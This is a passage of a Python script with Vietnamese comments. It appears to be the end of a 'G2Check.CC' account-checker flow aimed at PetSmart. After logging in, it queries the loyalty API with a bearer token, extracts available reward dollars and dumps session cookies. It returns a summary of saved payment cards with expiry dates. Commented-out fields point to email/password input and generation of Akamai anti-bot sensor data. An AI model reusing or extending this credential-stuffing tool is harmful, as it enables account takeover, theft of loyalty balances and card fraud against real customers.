        return
    # print("DEBUG - Step 12: Getting loyalty points...")

    # Lấy User-Agent từ context
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    
    url = "https://www.petsmart.com/api/cwea/loyalty/getMemberPoints"

    # print(f"DEBUG - Loyalty API URL: {url}")

    # Lấy accessToken từ context
    access_token = ctx.get("accessToken", "")
    if not access_token:
        # print("❌ No accessToken found - cannot call loyalty API")
        ctx.loyalty_success = False
        return

    # print(f"DEBUG - Using accessToken: {access_token[:50]}..." if len(access_token) > 50 else f"DEBUG - Using accessToken: {access_token}")

    try:
        r = (http.get(url)
               .header("Accept", "*/*")
               .header("Content-Type", "text/plain;charset=UTF-8")
               .header("Origin", "https://www.petsmart.com")
               .header("Accept-Language", "en-US,en;q=0.9")
               .header("User-Agent", user_agent)
               .header("Referer", "https://www.petsmart.com/")
               .header("Accept-Encoding", "gzip, deflate, br")
               .header("Authorization", f"Bearer {access_token}")
               .label("loyalty-api")
               .via_tls()
               .send())

        ctx.loyalty_status = r.status
        ctx.loyalty_response = r.text()
        ctx.loyalty_headers = dict(r.headers)

        # print(f"DEBUG - Loyalty API Status: {r.status}")
        # print(f"DEBUG - Loyalty API Response Length: {len(r.text())}")
        # print("=" * 80)
        # print("LOYALTY API RESPONSE BODY:")
        # print("=" * 80)
        # print(r.text())
        # print("=" * 80)

        # Lấy giá trị availableDollars từ response body
        import re
        response_text = r.text()
        available_dollars_pattern = r'"availableDollars":([^,]+)'
        available_dollars_match = re.search(available_dollars_pattern, response_text)
        
        if available_dollars_match:
            available_dollars = available_dollars_match.group(1).strip()
            # print(f"DEBUG - Found availableDollars: {available_dollars}")
            ctx.availableDollars = available_dollars
            print(f"✅ Extracted availableDollars: {available_dollars}")
        else:
            # print("❌ No availableDollars found in response")
            ctx.availableDollars = ""
            # print("❌ Failed to extract availableDollars")


        # Kiểm tra kết quả
        if r.status == 200:
            # print("✅ Loyalty API called successfully")
            ctx.loyalty_success = True
        else:
            print(f"❌ Loyalty API failed: {r.status}")
            ctx.loyalty_success = False

    except Exception as e:
        print(f"❌ Exception while calling loyalty API: {e}")
        ctx.loyalty_status = 0
        ctx.loyalty_response = ""
        ctx.loyalty_success = False


@step("dump_cookies_header")
def dump_cookies_header(ctx):
    """Step 13: Dump toàn bộ cookies của phiên sang định dạng header string"""
    if not ctx.auth_success:
        return
    # Lấy tất cả cookies từ CookieManager
    cookies = ctx.session.get("cookies", {}) or {}
    
    # Chuyển sang header string: key1=value1; key2=value2
    if isinstance(cookies, dict):
        parts = []
        for k, v in cookies.items():
            if v is None:
                continue
            # Đảm bảo giá trị là string
            parts.append(f"{k}={str(v)}")
        cookies_header = "; ".join(parts)
    else:
        # Phòng trường hợp cấu trúc không như mong đợi
        cookies_header = ""
    
    # Lưu vào context để finalize sử dụng
    ctx.cookies_header = cookies_header

@finalize
def done(ctx):
    """Kết thúc flow và trả về kết quả"""
    return {
        "status": ctx.get("status", "UNKNOWN"),
        "message": f" G2Check.CC - Getayments: {ctx.get('payments_success', False)}, Total Cards: {len(ctx.get('payment_card_exp', []))}, Loyalty: {ctx.get('loyalty_success', False)}, Dollars: {ctx.get('availableDollars', 'N/A')}, CardExp: {', '.join(ctx.get('payment_card_exp', []))}",
        "cookies": ctx.get('cookies_header', '')
        # "input_parsed": ctx.get("input_parsed", False),
        # "email": ctx.get("email", ""),
        # "password": ctx.get("password", ""),
        # "error_reason": ctx.get("error_reason", ""),
        # "cookies_imported": ctx.get("cookies_imported", False),
        # "homepage_status": ctx.get("homepage_status"),
        # "response_length": len(ctx.get("homepage_response", "")),
        # "hyper_script_path": ctx.get("hyper_script_path"),
        # "hyper_script_status": ctx.get("hyper_script_status"),
        # "hyper_script_success": ctx.get("hyper_script_success"),
        # "hyper_script_response_length": len(ctx.get("hyper_script_response", "")),
        # "script_content_length": len(ctx.get("script_content", "")),
        # "current_abck_cookie": ctx.get("current_abck_cookie", ""),
        # "bm_sz_cookie": ctx.get("bm_sz_cookie", ""),
        # "cookies_found": ctx.get("cookies_found", False),
        # "client_ip": ctx.get("client_ip", ""),
        # "ip_found": ctx.get("ip_found", False),
        # "ipify_status": ctx.get("ipify_status"),
        # "sensor_data_length": len(ctx.get("sensor_data", "")),
        # "sensor_context": ctx.get("sensor_context", ""),
        # "sensor_generation_success": ctx.get("sensor_generation_success", False),
        # "sensor_post_status": ctx.get("sensor_post_status"),
        # "sensor_post_success": ctx.get("sensor_post_success", False),
        # "sensor_post_response_length": len(ctx.get("sensor_post_response", "")),
        # "sensor_data_2_length": len(ctx.get("sensor_data_2", "")),
        # "sensor_context_2": ctx.get("sensor_context_2", ""),
        # "sensor_generation_2_success": ctx.get("sensor_generation_2_success", False),
        # "sensor_post_2_status": ctx.get("sensor_post_2_status"),
        # "sensor_post_2_success": ctx.get("sensor_post_2_success", False),
        # "sensor_post_2_response_length": len(ctx.get("sensor_post_2_response", "")),
        # "sensor_data_3_length": len(ctx.get("sensor_data_3", "")),
        # "sensor_context_3": ctx.get("sensor_context_3", ""),
        # "sensor_generation_3_success": ctx.get("sensor_generation_3_success", False),
        # "sensor_post_3_status": ctx.get("sensor_post_3_status"),
        # "sensor_post_3_success": ctx.get("sensor_post_3_success", False),
        # "sensor_post_3_response_length": len(ctx.get("sensor_post_3_response", "")),
        # "abck_validation_complete": ctx.get("abck_validation_complete", False),
        # "abck_validation_reason": ctx.get("abck_validation_reason", ""),
        # "final_cookies_count": len(ctx.get("final_cookies", {})),
        # "final_cookies": ctx.get("final_cookies", {}),
        # "auth_status": ctx.get("auth_status"),
        # "auth_success": ctx.get("auth_success", False),
        # "auth_response_length": len(ctx.get("auth_response", "")),
        # "auth_success_reason": ctx.get("auth_success_reason", ""),
        # "auth_failure_reason": ctx.get("auth_failure_reason", ""),
        # "payments_status": ctx.get("payments_status"),
        # "payments_success": ctx.get("payments_success", False),
        # "payments_response_length": len(ctx.get("payments_response", "")),
        # "payment_card_exp": ctx.get("payment_card_exp", []),
        # "payment_card_exp_count": ctx.get("payment_card_exp_count", 0),
        # "accessToken": ctx.get("accessToken", ""),
        # "loyalty_status": ctx.get("loyalty_status"),
        # "loyalty_success": ctx.get("loyalty_success", False),
        # "loyalty_response_length": len(ctx.get("loyalty_response", "")),
        # "availableDollars": ctx.get("availableDollars", ""),
        
    }

# Đăng ký flow
flow.register(globals())

if __name__ == "__main__":
    pass
